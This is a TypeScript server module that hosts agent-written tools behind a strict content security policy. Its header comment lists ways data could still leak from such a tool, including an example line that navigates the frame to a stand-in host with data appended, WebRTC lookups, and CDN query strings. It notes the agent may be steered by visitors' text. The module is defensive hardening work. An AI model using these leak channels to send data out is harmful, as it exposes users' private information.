// SERVING AN AGENT'S TOOL ON ITS OWN PRIVATE HOST (spec local 2026-11-22-herramienta-dentro-del-agente, §2): its PUBLISHED
// version — never the folder mid-edit — with `window.openlen` first in the shell's <head>, and the bridge script for the
// screen that frames it. The same shape as an installed tool's host (`lib/tools/serve.ts`), with three differences:
// there is no plan check at all (it is for every plan: what a tool costs is the turn of the agent that writes it), the
// bridge it gets is the agent-tool variant (`context`, `sendPrompt` and `data`, nothing else), and EVERY answer carries a
// tight content policy. The code of the tool is written by an agent that sometimes reads text of other people — the visitors
// of a page it attends — so what it stores must not be able to leave it: scripts and styles come from the visuals' CDNs and
// from its own files, and the only place it can connect to is itself. Framed only by the workspace, or on the phone's own
// label only by the phone app. It never runs on openlen.com.
//
// What the policy does NOT close, said plainly: a content policy governs fetch, XHR, forms, frames and where scripts,
// styles, fonts and images load from — not every way a page can reach the network. Left open by the browser itself:
//   · the frame navigating itself (`location.href = "https://elsewhere/?" + data`) — a sandbox without
//     `allow-top-navigation` keeps the parent page, not the frame's own document;
//   · WebRTC's ICE/STUN lookups, which no CSP directive governs;
//   · the URLs it asks the allowed CDNs (and fonts.googleapis.com) for — a path or query there is a request to them.
// DNS prefetching is switched off below (`x-dns-prefetch-control`), and so are camera, microphone, geolocation and
// payment (`permissions-policy`, matched by the frame's own `allow` list).
import "server-only";

import { agentToolsEnabled } from "@/lib/agent-tools/enabled";
import { isBlobPointer } from "@/lib/files/blob-pointer";
import { frameAncestors } from "@/lib/lienzo/host";
import { ORIGENES_DE_LA_APP } from "@/lib/movil/cors";
import { injectToolBridge, TOOL_BRIDGE_PATH } from "@/lib/tools/bridge/inject";
import { toolBridgeClientSource } from "@/lib/tools/bridge/client-source";
import { toolParentOrigins } from "@/lib/tools/serve";
import type { ToolReleaseFile } from "@/lib/tools/types";
import { GOOGLE_FONT_FILES, GOOGLE_FONT_STYLES, VISUALS_CDN_ORIGINS } from "@/lib/visuals/frame-document";

import type { AgentToolRow } from "./store";

type Env = Readonly<Record<string, string | undefined>>;

export interface AgentServeDeps {
  readRelease(sha: string): Promise<Record<string, ToolReleaseFile> | null>;
  getBlob(pointer: string): Promise<Uint8Array>;
}

async function realServeDeps(): Promise<AgentServeDeps> {
  const [store, blob] = await Promise.all([import("@/lib/tools/store"), import("@/lib/files/blob")]);
  return { readRelease: store.readRelease, getBlob: (p) => blob.getBlob(p) };
}

/**
 * The content policy of every answer of a served tool: the visuals' (`visualFrameCsp`: the same CDNs for scripts, styles and
 * fonts), plus the tool's own files (`'self'`) — and `connect-src 'self'`, so it can fetch its own files and nothing else:
 * no CDN, no other origin. Images and media are its own files or inline; no form posts, no `<base>`, no frames.
 */
export function agentToolContentPolicy(ancestors: string): string {
  const cdns = VISUALS_CDN_ORIGINS.join(" ");
  return [
    "default-src 'none'",
    `script-src 'self' 'unsafe-inline' ${cdns}`,
    `style-src 'self' 'unsafe-inline' ${cdns} ${GOOGLE_FONT_STYLES}`,
    `font-src 'self' ${cdns} ${GOOGLE_FONT_FILES} data:`,
    "img-src 'self' data: blob:",
    "media-src 'self' data: blob:",
    "connect-src 'self'",
    "form-action 'none'",
    "base-uri 'none'",
    "frame-src 'none'",
    "worker-src blob:",
    `frame-ancestors ${ancestors}`,
  ].join("; ");
}

/** The canvas route's own 404, byte for byte (its `noEncontrado`): a label that is a tool with nothing at that path must
 *  not be told apart from a label that is nothing at all. */
const notFound = (env: Env = process.env) =>
  new Response("not found", {
    status: 404,
    headers: {
      "content-type": "text/plain; charset=utf-8",
      "cache-control": "no-store",
      "content-security-policy": `frame-ancestors ${frameAncestors(env)}`,
      "referrer-policy": "no-referrer",
      "x-content-type-options": "nosniff",
    },
  });

export async function serveAgentTool(
  row: AgentToolRow & { readonly servedTo: "workspace" | "phone" },
  path: string,
  o: { readonly requestHost: string | null; readonly env?: Env },
  deps?: AgentServeDeps,
): Promise<Response> {
  const env = o.env ?? process.env;
  if (!agentToolsEnabled(env)) return notFound(env);
  const phone = row.servedTo === "phone";
  const headers = {
    "content-security-policy": agentToolContentPolicy(phone ? ORIGENES_DE_LA_APP.join(" ") : frameAncestors(env)),
    "cache-control": "no-store",
    "x-content-type-options": "nosniff",
    "referrer-policy": "no-referrer",
    "x-dns-prefetch-control": "off",
    "permissions-policy": "camera=(), microphone=(), geolocation=(), payment=()",
  };

  if (path === TOOL_BRIDGE_PATH) {
    const parents = phone ? [...ORIGENES_DE_LA_APP] : toolParentOrigins(o.requestHost, env);
    return new Response(toolBridgeClientSource(parents, { agentTool: true }), {
      status: 200,
      headers: { ...headers, "content-type": "application/javascript; charset=utf-8" },
    });
  }

  const d = deps ?? (await realServeDeps());
  const release = await d.readRelease(row.releaseSha);
  if (!release) return notFound(env);
  const key = path === "/" ? "/index.html" : path;
  // a path is a key of the version's files and nothing else (`/__proto__`, `/constructor`… are not files)
  const file = Object.prototype.hasOwnProperty.call(release, key) ? release[key] : undefined;
  if (!file) return notFound(env);
  if (key === "/index.html") {
    return new Response(injectToolBridge(file.content), { status: 200, headers: { ...headers, "content-type": "text/html; charset=utf-8" } });
  }
  const body = isBlobPointer(file.content) ? new Uint8Array(await d.getBlob(file.content)) : file.content;
  return new Response(body, { status: 200, headers: { ...headers, "content-type": file.contentType } });
}
